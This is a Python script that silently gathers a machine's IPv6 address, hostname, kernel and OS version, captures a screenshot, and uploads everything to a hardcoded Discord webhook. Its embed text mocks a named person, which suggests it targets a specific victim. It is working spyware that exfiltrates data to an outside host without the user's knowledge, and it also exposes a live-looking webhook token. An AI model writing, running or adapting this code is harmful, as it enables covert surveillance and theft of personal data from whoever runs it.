import requests
import os
from PIL import ImageGrab
import platform
import psutil
import socket  

WEBHOOK_URL = "https://discord.com/api/webhooks/1297187641636159538/58LmoxoSJRxLzByNcGmEQ8v1ZpuIMb_RXku5WynFoI-R6IpNGm_qV_y4TOXUmCn3KKxF" 

def get_ipv6_address():
    """Get the IPv6 address of the machine."""
    try:
        for interface, addrs in psutil.net_if_addrs().items():
            for addr in addrs:
                if addr.family == socket.AF_INET6 and addr.address != '::1':  
                    return addr.address
    except Exception as e:
        print(f"Error retrieving IPv6 address: {e}")
    return None

def get_system_info():
    """Get system name, kernel version, and OS version."""
    system_name = platform.node()  
    kernel_version = platform.release()  
    os_version = platform.system() + " " + platform.release()  
    return system_name, kernel_version, os_version

def capture_screenshot():
    """Capture a screenshot and save it."""
    screenshot = ImageGrab.grab()
    screenshot_path = "screenshot.png"
    screenshot.save(screenshot_path)
    return screenshot_path

def send_message_to_discord(ipv6, system_name, kernel_version, os_version, screenshot_path):
    embed = {
        "title": f"New chakkad from dumbass bilal {system_name}",
        "description": "",
        "footer": {"text": "BILAL"},
        "fields": [
            {"name": "IPv6 bilal", "value": ipv6},
            {"name": "System bilal", "value": system_name},
            {"name": "Kernel bilal", "value": kernel_version},
            {"name": "OS bilal", "value": os_version},
        ],
        "color": 0x00BBFF,
    }
    
    requests.post(WEBHOOK_URL, json={"embeds": [embed]})
    
    with open(screenshot_path, 'rb') as f:
        requests.post(WEBHOOK_URL, files={'file': f})

def main():
    ipv6_address = get_ipv6_address()
    system_name, kernel_version, os_version = get_system_info()
    screenshot_path = capture_screenshot()

    if ipv6_address:
        send_message_to_discord(ipv6_address, system_name, kernel_version, os_version, screenshot_path)
        print("Message and screenshot sent to Discord successfully!")
    else:
        send_message_to_discord("No IPv6 found", system_name, kernel_version, os_version, screenshot_path)
        print("No IPv6 address found. Message sent without it.")

if __name__ == "__main__":
    main()
